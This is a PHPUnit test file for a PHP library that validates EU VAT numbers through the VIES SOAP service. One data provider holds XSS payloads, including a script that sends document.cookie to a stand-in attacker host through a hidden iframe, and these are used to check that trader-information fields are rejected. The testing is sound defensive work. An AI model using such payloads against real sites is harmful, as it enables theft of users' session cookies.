<?php
declare (strict_types=1);

namespace DragonBe\Test\Vies;

use DragonBe\Vies\CheckVatResponse;
use DragonBe\Vies\HeartBeat;
use DragonBe\Vies\Vies;
use DragonBe\Vies\ViesException;
use DragonBe\Vies\ViesServiceException;
use PHPUnit\Framework\TestCase;
use SoapClient;
use SoapFault;

/**
 * @coversDefaultClass \DragonBe\Vies\Vies
 */
class ViesTest extends TestCase
{
    public function vatNumberProvider()
    {
        return  [
            ['0123456749','0123456749'],
            ['0123 456 749','0123456749'],
            ['0123.456.749','0123456749'],
            ['0123-456-749','0123456749'],
        ];
    }
    /**
     * @dataProvider vatNumberProvider
     * @covers ::filterVat
     */
    public function testVatNumberFilter($vatNumber, $filteredNumber)
    {
        $this->assertEquals($filteredNumber, Vies::filterVat($vatNumber));
    }

    protected function createdStubbedViesClient($response)
    {
        $stub = $this->getMockFromWsdl(dirname(__FILE__) . '/_files/checkVatService.wsdl');

        $stub->expects($this->any())
             ->method('__soapCall')
             ->will($this->returnValue($response));

        return (new Vies())->setSoapClient($stub);
    }

    /**
     * @covers ::validateVat
     * @covers ::setSoapClient
     */
    public function testSuccessVatNumberValidation()
    {
        $response = (object) [];
        $response->countryCode = 'BE';
        $response->vatNumber = '0123.456.749';
        $response->requestDate = '1983-06-24+23:59';
        $response->valid = true;
        $response->traderName = '';
        $response->traderAddress = '';
        $response->requestIdentifier = 'XYZ1234567890';

        $response = $this
            ->createdStubbedViesClient($response)
            ->validateVat('BE', '0123.456.749')
        ;

        $this->assertInstanceOf(CheckVatResponse::class, $response);
        $this->assertTrue($response->isValid());

        return $response;
    }

    /**
     * @covers ::validateVat
     * @covers ::setSoapClient
     */
    public function testSuccessVatNumberValidationWithRequester()
    {
        $response = (object) [];
        $response->countryCode = 'BE';
        $response->vatNumber = '0123.456.749';
        $response->requestDate = '1983-06-24+23:59';
        $response->valid = true;
        $response->traderName = '';
        $response->traderAddress = '';
        $response->requestIdentifier = 'XYZ1234567890';

        $response = $this
            ->createdStubbedViesClient($response)
            ->validateVat('BE', '0123.456.749', 'PL', '1234567890')
        ;

        $this->assertInstanceOf(CheckVatResponse::class, $response);
        $this->assertTrue($response->isValid());

        return $response;
    }

    /**
     * @covers ::validateVat
     * @covers ::setSoapClient
     */
    public function testFailureVatNumberValidation()
    {
        $response = (object) [];
        $response->countryCode = 'BE';
        $response->vatNumber = '0123.ABC.749';
        $response->requestDate = '1983-06-24+23:59';
        $response->valid = false;

        $response = $this
            ->createdStubbedViesClient($response)
            ->validateVat('BE', '0123.ABC.749')
        ;

        $this->assertInstanceOf(CheckVatResponse::class, $response);
        $this->assertFalse($response->isValid());
    }

    public function badCountryCodeProvider()
    {
        return [
            ['AA'],
            ['TK'],
            ['PH'],
            ['FS'],
        ];
    }
    /**
     * Test to see the country code is rejected if not existing in the EU
     *
     * @dataProvider badCountryCodeProvider
     * @covers ::validateVat
     * @param $code
     */
    public function testExceptionIsRaisedForNonEuropeanUnionCountryCodes($code)
    {
        $this->expectException(ViesException::class);
        (new Vies())->validateVat($code, 'does not matter');
    }

    /**
     * Test to see the country code is rejected if not existing in the EU
     *
     * @dataProvider badCountryCodeProvider
     * @covers ::validateVat
     * @expectedException \DragonBe\Vies\ViesException
     * @param $code
     */
    public function testExceptionIsRaisedForNonEuropeanUnionCountryCodesRequester($code)
    {
        $this->expectException(ViesException::class);
        (new Vies())->validateVat('BE', '0123.456.749', $code, 'does not matter');
    }

    /**
     * Test exception ViesServiceException is thrown after SoapFault exception
     *
     * @dataProvider vatNumberProvider
     * @param $vat
     */
    public function testExceptionIsRaisedSoapFault($vat)
    {
        $this->expectException(ViesServiceException::class);
        $stub = $this->getMockFromWsdl(dirname(__FILE__) . '/_files/checkVatService.wsdl');
        $stub->expects($this->any())
            ->method('__soapCall')
            ->will($this->throwException(new SoapFault("test", "myMessage")));

        (new Vies())
            ->setSoapClient($stub)
            ->validateVat('BE', $vat)
        ;
    }

    /**
     * @param CheckVatResponse $response
     *
     * @depends testSuccessVatNumberValidation
     * @covers \DragonBe\Vies\CheckVatResponse::toArray
     */
    public function testConvertObjectIntoArray($response)
    {
        $array = $response->toArray();
        $this->assertSame('BE', $array['countryCode']);
        $this->assertSame('0123.456.749', $array['vatNumber']);
        $this->assertSame('1983-06-24', $array['requestDate']);
        $this->assertSame('XYZ1234567890', $array['identifier']);
        $this->assertTrue($array['valid']);
        $this->assertEmpty($array['name']);
        $this->assertEmpty($array['address']);
    }

    private function createHeartBeatMock($bool)
    {
        $heartBeatMock = $this->getMockBuilder(HeartBeat::class)
            ->setMethods(['isAlive'])
            ->getMock();

        $heartBeatMock->expects($this->once())
            ->method('isAlive')
            ->will($this->returnValue($bool));

        return $heartBeatMock;
    }

    /**
     * @covers ::getHeartBeat
     * @covers ::setHeartBeat
     */
    public function testServiceIsAlive()
    {
        $vies = new Vies();
        $vies->setHeartBeat($this->createHeartBeatMock(true));
        $this->assertTrue($vies->getHeartBeat()->isAlive());
    }

    /**
     * @covers ::getHeartBeat
     * @covers ::setHeartBeat
     */
    public function testServiceIsDown()
    {
        $vies = new Vies();
        $vies->setHeartBeat($this->createHeartBeatMock(false));
        $this->assertFalse($vies->getHeartBeat()->isAlive());
    }

    /**
     * @covers ::getSoapClient
     * @todo: SoapClient connects to european commission VIES service at initialisation
     */
    public function testGettingDefaultSoapClient()
    {
        if (defined('HHVM_VERSION') && ! extension_loaded('soap')) {
            $this->markTestSkipped('SOAP not installed');
        }
        $vies = new Vies();
        $vies->setSoapClient($this->createdStubbedViesClient('blabla')->getSoapClient());
        $soapClient = $vies->getSoapClient();
        $this->assertInstanceOf(SoapClient::class, $soapClient);
    }

    /**
     * @covers ::getSoapClient
     */
    public function testDefaultSoapClientIsLazyLoaded()
    {
        if (defined('HHVM_VERSION') && ! extension_loaded('soap')) {
            $this->markTestSkipped('SOAP not installed');
        }
        $wsdl = dirname(__FILE__) . '/_files/checkVatService.wsdl';
        $vies = new Vies();
        $vies->setWsdl($wsdl);
        $this->assertInstanceOf(SoapClient::class, $vies->getSoapClient());
    }

    /**
     * @covers ::setOptions
     * @covers ::getOptions
     */
    public function testOptionsCanBeSet()
    {
        $options = ['foo' => 'bar'];
        $vies = new Vies();
        $vies->setOptions($options);
        $this->assertSame($options, $vies->getOptions());
    }

    /**
     * @covers ::getWsdl
     */
    public function testGettingDefaultWsdl()
    {
        $expected = sprintf('%s://%s%s', Vies::VIES_PROTO, Vies::VIES_DOMAIN, Vies::VIES_WSDL);
        $this->assertSame($expected, (new Vies())->getWsdl());
    }

    /**
     * @covers ::setWsdl
     */
    public function testSettingCustomWsdl()
    {
        $wsdl = 'http://www.example.com/?wsdl';
        $vies = new Vies();
        $vies->setWsdl($wsdl);
        $actual = $vies->getWsdl();
        $this->assertSame($wsdl, $actual);
    }

    /**
     * @covers ::setOptions
     * @covers ::getOptions
     */
    public function testSettingSoapOptions()
    {
        if (defined('HHVM_VERSION')) {
            $this->markTestSkipped('This test does not work for HipHop VM');
        }
        $options = [
            'soap_version' => SOAP_1_1,
        ];
        $vies = new Vies();
        $vies->setSoapClient($this->createdStubbedViesClient('blabla')->getSoapClient());
        $vies->setOptions($options);
        $soapClient = $vies->getSoapClient();
        $actual = $soapClient->_soap_version;
        $this->assertSame($options['soap_version'], $actual);
        $this->assertSame($options, $vies->getOptions());
    }

    /**
     * @covers ::getOptions
     */
    public function testDefaultOptionsAreEmpty()
    {
        $vies = new Vies();
        $options = $vies->getOptions();
        $this->assertInternalType('array', $options);
        $this->assertEmpty($options);
    }

    /**
     * @covers ::getHeartBeat
     */
    public function testGetDefaultHeartBeatWhenNoneSpecified()
    {
        $hb = (new Vies())->getHeartBeat();
        $this->assertInstanceOf(HeartBeat::class, $hb);
        $this->assertSame(Vies::VIES_DOMAIN, $hb->getHost());
        $this->assertSame(Vies::VIES_PORT, $hb->getPort());
    }

    /**
     * @covers ::listEuropeanCountries
     */
    public function testRetrievingListOfEuropeanCountriesStatically()
    {
        $this->assertCount(Vies::VIES_EU_COUNTRY_TOTAL, Vies::listEuropeanCountries());
    }

    /**
     * Data provider that will generate bad VAT ID's
     *
     * @return array
     */
    public function badVatIdProvider(): array
    {
        return [
            ['UU', '1239874560'],
            ['AA', '1234567890'],
        ];
    }

    /**
     * Validates exception it thrown if VAT checksum fails on
     * provided country code and VAT ID
     *
     * @param string $countryCode
     * @param string $vatId
     *
     * @dataProvider badVatIdProvider
     * @covers ::validateVatSum
     */
    public function testValidateVatSumToThrowException(
        string $countryCode,
        string $vatId
    ) {
        $vies = new Vies();
        $this->expectException(ViesException::class);
        $vies->validateVatSum($countryCode, $vatId);
        $this->fail('Expected exception was not thrown');
    }

    /**
     * Test functionality to add optional arguments for VIES validation
     *
     * @covers ::addOptionalArguments
     */
    public function testCanAddOptionalArgumentsWithValue()
    {
        $viesRef = new \ReflectionClass(Vies::class);
        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
        $addOptionalArguments->setAccessible(true);

        $array = [];
        $object = new Vies();
        $addOptionalArguments->invokeArgs($object, [&$array, 'foo', 'bar']);
        $addOptionalArguments->invokeArgs($object, [&$array, 'bar', 'baz']);
        $addOptionalArguments->invokeArgs($object, [&$array, 'baz', 'foobar']);
        $this->assertCount(3, $array);
    }

    /**
     * Test functionality to add optional arguments for VIES validation
     * only if they have value
     *
     * @covers ::addOptionalArguments
     */
    public function testCanNotAddOptionalArgumentsWithoutValue()
    {
        $viesRef = new \ReflectionClass(Vies::class);
        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
        $addOptionalArguments->setAccessible(true);

        $array = [];
        $object = new Vies();
        $addOptionalArguments->invokeArgs($object, [&$array, 'foo', '']);
        $addOptionalArguments->invokeArgs($object, [&$array, 'bar', '']);
        $addOptionalArguments->invokeArgs($object, [&$array, 'baz', '']);
        $this->assertCount(0, $array);
    }

    /**
     * A bad data provider for the optional arguments one can send
     * with the request.
     *
     * @return array
     */
    public function badOptionalInformationProvider(): array
    {
        return [
            [
                '<script>alert("xss");</script>',
                'Ltd',
                'Main Street 1',
                '1000',
                'Some Town',
            ],
            [
                'HackThePlanet',
                '<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'
                + document.cookie.escape() + \'" height=0 width=0 />\');</script>',
                'Main Street 1',
                '1000',
                'Some Town',
            ],
            [
                'HackThePlanet',
                'Ltd',
                "Main Street 1\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22"
                . "\x78\x73\x73\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e",
                '1000',
                'Some Town',
            ],
            [
                'HackThePlanet',
                'Ltd',
                'Main Street 1',
                '1000',
                '<s c r i p t>alert("xss");</s c r i p t>',
            ],
        ];
    }

    /**
     * Test validation of optional trader information data
     *
     * @param string $traderName
     * @param string $traderCompanyType
     * @param string $traderStreet
     * @param string $traderPostcode
     * @param string $traderCity
     *
     * @covers ::addOptionalArguments
     * @covers ::filterArgument
     * @covers ::validateArgument
     * @dataProvider badOptionalInformationProvider
     */
    public function testRejectBadOptionalInformation(
        string $traderName,
        string $traderCompanyType,
        string $traderStreet,
        string $traderPostcode,
        string $traderCity
    ) {
        $viesRef = new \ReflectionClass(Vies::class);
        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
        $addOptionalArguments->setAccessible(true);

        $array = [];
        $object = new Vies();
        $this->expectException(\InvalidArgumentException::class);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderName', $traderName]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCompanyType', $traderCompanyType]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderStreet', $traderStreet]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderPostcode', $traderPostcode]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCity', $traderCity]);
        $this->fail('Expected exception was not thrown');
    }

    /**
     * Generate valid optional information that should be validated
     *
     * @return array
     */
    public function validOptionalInformationProvider(): array
    {
        return [
            [
                'Good Business',
                'Ltd',
                'Main Street 1',
                '1000',
                'Some Town',
            ],
        ];
    }

    /**
     * Test validation of valid optional trader information data
     *
     * @param string $traderName
     * @param string $traderCompanyType
     * @param string $traderStreet
     * @param string $traderPostcode
     * @param string $traderCity
     *
     * @covers ::addOptionalArguments
     * @covers ::filterArgument
     * @covers ::validateArgument
     * @dataProvider validOptionalInformationProvider
     */
    public function testAllowValidOptionalInformation(
        string $traderName,
        string $traderCompanyType,
        string $traderStreet,
        string $traderPostcode,
        string $traderCity
    ) {
        $viesRef = new \ReflectionClass(Vies::class);
        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
        $addOptionalArguments->setAccessible(true);

        $array = [];
        $object = new Vies();
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderName', $traderName]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCompanyType', $traderCompanyType]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderStreet', $traderStreet]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderPostcode', $traderPostcode]);
        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCity', $traderCity]);
        $this->assertCount(5, $array);
    }

    /**
     * See if we can ensure invalid arguments are rejected from input
     *
     * @covers ::addOptionalArguments
     * @covers ::filterArgument
     * @covers ::validateArgument
     */
    public function testBreakValidationOfOptionalArguments()
    {
        $viesRef = new \ReflectionClass(Vies::class);
        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
        $addOptionalArguments->setAccessible(true);

        $this->expectException(\TypeError::class);
        $array = [];
        $object = new Vies();
        $addOptionalArguments->invokeArgs($object, [&$array, 0, []]);
        $this->assertSame([], $array);
    }

    /**
     * Testing that the Soap constants are defined
     *
     * @link https://secure.php.net/soap_client
     * @group issue-60
     * @see https://github.com/DragonBe/vies/issues/60
     */
    public function testSoapVersionsAreDefinedAsConstants()
    {
        $this->assertTrue(defined('SOAP_1_1'));
        $this->assertTrue(defined('SOAP_1_2'));

        $v1 = var_export(SOAP_1_1, true);
        $v2 = var_export(SOAP_1_2, true);

        $this->assertSame('1', $v1);
        $this->assertSame('2', $v2);
    }

    /**
     * Testing if the warning is not triggered by something else
     *
     * @link https://secure.php.net/soap_client
     * @group issue-60
     * @see https://github.com/DragonBe/vies/issues/60
     */
    public function testSoapVersionsDoNotTriggerWarning()
    {
        $result = eval(file_get_contents(__DIR__ . '/_files/soapVersionCheck.code'));
        $expected = "array (\n  0 => 1,\n  1 => 2,\n)";
        $this->assertEquals($expected, $result);
    }

    /**
     * A provider to test SOAP versions
     * @return array
     */
    public function soapVersionProvider(): array
    {
        return [
            [SOAP_1_1, '1'],
            [SOAP_1_2, '2'],
        ];
    }

    /**
     * Test soap client version are defined
     *
     * @param int $soapVersion
     * @param string $expectedValue
     *
     * @covers ::setSoapClient
     * @covers ::getSoapClient
     * @covers ::getWsdl
     *
     * @group issue-60
     * @see https://github.com/DragonBe/vies/issues/60
     * @dataProvider soapVersionProvider
     */
    public function testSoapVersionsAreDefined(int $soapVersion, string $expectedValue)
    {
        $soapV = var_export($soapVersion, true);
        $this->assertSame($expectedValue, $soapV);

        $vies = new Vies();
        $soapClient = $this->getMockBuilder(SoapClient::class)
            ->setConstructorArgs([$vies->getWsdl(), ['soap_version' => $soapVersion]])
            ->getMock();
        $vies->setSoapClient($soapClient);

        $this->assertInstanceOf(SoapClient::class, $vies->getSoapClient());
    }

    public function vatTestNumberProvider(): array
    {
        return [
            'Belgian VAT ID that tests valid' => ['BE', '100', true],
            'Irish VAT ID that tests invalid' => ['IE', '200', false],
            'German VAT ID that tests valid'  => ['DE', '100', true],
        ];
    }

    /**
     * Testing the test VAT SOAP service
     *
     * @param string $countryCode
     * @param string $vatNumber
     * @param bool $expectation
     * @throws ViesException
     * @throws ViesServiceException
     *
     * @covers ::validateTestVat
     * @covers ::validateVat
     * @covers ::setWsdl
     *
     * @dataProvider vatTestNumberProvider
     */
    public function testViesTestService(string $countryCode, string $vatNumber, bool $expectation)
    {
        $result = (new Vies())->validateVat($countryCode, $vatNumber);
        $this->assertSame($expectation, $result->isValid());
    }

    /**
     * Testing if we can catch soap exceptions when trying
     * to make VIES test calls
     *
     * @throws ViesException
     * @throws ViesServiceException
     * @throws \ReflectionException
     *
     * @covers ::validateVat
     * @covers ::validateTestVat
     */
    public function testExceptionIsRaisedWhenSoapCallFailsForTestService()
    {
        $this->expectException(ViesServiceException::class);
        $stub = $this->getMockFromWsdl(dirname(__FILE__) . '/_files/checkVatTestService.wsdl');
        $stub->expects($this->any())
            ->method('__soapCall')
            ->will($this->throwException(new SoapFault("test", "myMessage")));

        (new Vies())
            ->setSoapClient($stub)
            ->validateVat('BE', '100')
        ;
        $this->fail('Expected exception was not raised');
    }

    /**
     * Testing to see if we can split a combined
     * VAT ID into country code and VAT number.
     *
     * @covers ::splitVatId
     */
    public function testSplitVatId()
    {
        $vatId = 'BE1234567890';
        $countryCode = 'BE';
        $vatNumber = '1234567890';
        $resultSet = (new Vies())->splitVatId($vatId);
        $this->assertSame($countryCode, $resultSet['country']);
        $this->assertSame($vatNumber, $resultSet['id']);
    }

    /**
     * Testing to see if we allow test codes to be used
     * for testing VIES services
     *
     * @covers ::allowTestCodes
     * @covers ::areTestCodesAllowed
     */
    public function testAllowingTestCodes()
    {
        $vies = (new Vies())->allowTestCodes();
        $this->assertTrue($vies->areTestCodesAllowed());
    }

    /**
     * Testing to see if we disallow test codes to be used
     * for testing VIES services
     *
     * @covers ::disallowTestCodes
     * @covers ::areTestCodesAllowed
     */
    public function testDisallowingTestCodes()
    {
        $vies = (new Vies())->disallowTestCodes();
        $this->assertFalse($vies->areTestCodesAllowed());
    }
}
